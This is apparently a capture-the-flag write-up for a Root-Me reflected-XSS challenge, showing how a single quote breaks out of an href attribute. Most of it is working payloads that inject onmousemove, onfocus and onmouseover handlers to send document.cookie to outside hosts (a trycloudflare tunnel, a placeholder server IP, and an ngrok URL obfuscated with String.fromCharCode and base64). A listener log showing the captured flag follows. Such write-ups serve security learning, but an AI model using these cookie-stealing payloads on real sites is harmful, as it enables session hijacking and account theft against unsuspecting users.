In this challenge, the enpoint is 
```
http://challenge01.root-me.org/web-client/ch26/?p=test123
```
Reflected:
```html
<p>The page <a href='?p=test123'>test123</a> could not be found.</p>
```
Initial payload:
```html
test123' onclick='alert()
```

Test through [various events](https://www.w3schools.com/tags/ref_eventattributes.asp), **onmousemove** worked
```html
test123'onmousemove='document.location="https://offers-germany-promised-paying.trycloudflare.com?c=".concat(document.cookie)
```

Request:
```
127.0.0.1 - - [25/Feb/2025 20:24:27] code 404, message File not found
127.0.0.1 - - [25/Feb/2025 20:24:27] "GET /favicon.ico HTTP/1.1" 404 -
127.0.0.1 - - [25/Feb/2025 20:24:27] "GET /?c= HTTP/1.1" 200 -
127.0.0.1 - - [25/Feb/2025 20:24:27] "GET /?c= HTTP/1.1" 200 -
127.0.0.1 - - [25/Feb/2025 20:24:27] "GET /?c= HTTP/1.1" 200 -
127.0.0.1 - - [25/Feb/2025 20:24:27] "GET /?c= HTTP/1.1" 200 -
127.0.0.1 - - [25/Feb/2025 20:24:27] "GET /?c= HTTP/1.1" 200 -
127.0.0.1 - - [25/Feb/2025 20:25:58] "GET /?c=flag=********_***_*** HTTP/1.1" 200 -
```
Other payloads:
```html
'p=’onfocus=’document.write`<img src=x onerror=setInterval(function(){
   with(document) body.appendChild(createElement("script"))
   .src="//[server_ip]:4848/?".concat(document.cookie)
},1010)>` ’autofocus=
```
```html
p=''onmouseover='window.location=String.fromCharCode(104,116,116,112,58,47,47,102,54,48,101,98,50,50,98,46,110,103,114,111,107,46,105,111,47).concat(btoa(document.cookie))'
```